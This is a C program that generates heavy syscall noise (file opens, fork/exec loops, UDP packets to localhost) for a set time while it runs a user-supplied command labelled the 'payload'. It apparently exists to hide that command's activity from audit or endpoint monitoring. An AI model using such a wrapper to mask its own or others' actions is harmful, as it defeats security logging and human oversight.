#define _GNU_SOURCE
#include <pthread.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>

static volatile int flood_active = 0;
static uint64_t flood_end_ns = 0;

static uint64_t now_ns(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static void *file_thread(void *arg)
{
    (void)arg;
    while (flood_active && now_ns() < flood_end_ns) {
        int fd = open("/proc/cpuinfo", O_RDONLY);
        if (fd >= 0) { struct stat st; fstat(fd, &st); close(fd); }
    }
    return NULL;
}

static void *exec_thread(void *arg)
{
    (void)arg;
    while (flood_active && now_ns() < flood_end_ns) {
        pid_t p = fork();
        if (p == 0)  { execl("/bin/true", "true", NULL); _exit(0); }
        if (p > 0)   { waitpid(p, NULL, 0); }
    }
    return NULL;
}

static void *net_thread(void *arg)
{
    (void)arg;
    int s = socket(AF_INET, SOCK_DGRAM, 0); if (s < 0) return NULL;
    struct sockaddr_in dst = {};
    dst.sin_family = AF_INET; dst.sin_port = htons(53);
    dst.sin_addr.s_addr = htonl(0x7f000001);
    char buf[8] = {};
    while (flood_active && now_ns() < flood_end_ns)
        sendto(s, buf, sizeof(buf), 0, (struct sockaddr*)&dst, sizeof(dst));
    close(s);
    return NULL;
}

int main(int argc, char *argv[])
{
    if (argc < 4) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    long ms      = atol(argv[1]);
    int  nthread = atoi(argv[2]);
    if (nthread < 1) nthread = 1;
    if (nthread > 64) nthread = 64;

    int cmd = -1;
    for (int i = 3; i < argc; i++)
        if (!strcmp(argv[i], "--")) { cmd = i + 1; break; }
    if (cmd < 0 || cmd >= argc) {
        fprintf(stderr, "[-] missing -- <cmd>\n"); return 1;
    }

    pthread_t *tids = calloc((size_t)(nthread + 2), sizeof(pthread_t));

    flood_end_ns = now_ns() + (uint64_t)ms * 1000000ULL;
    flood_active = 1;

    for (int i = 0; i < nthread; i++)
        pthread_create(&tids[i], NULL, file_thread, NULL);
    pthread_create(&tids[nthread],     NULL, exec_thread, NULL);
    pthread_create(&tids[nthread + 1], NULL, net_thread,  NULL);

    fprintf(stderr, "[*] flood: %ldms %d+2 threads - running payload\n", ms, nthread);

    pid_t child = fork();
    if (child == 0) { execvp(argv[cmd], &argv[cmd]); perror("execvp"); _exit(1); }

    int st; waitpid(child, &st, 0);
    int rc = WIFEXITED(st) ? WEXITSTATUS(st) : 1;

    flood_active = 0;
    for (int i = 0; i < nthread + 2; i++) pthread_join(tids[i], NULL);
    free(tids);

    fprintf(stderr, "[*] payload exited %d, flood done\n", rc);
    return rc;
}
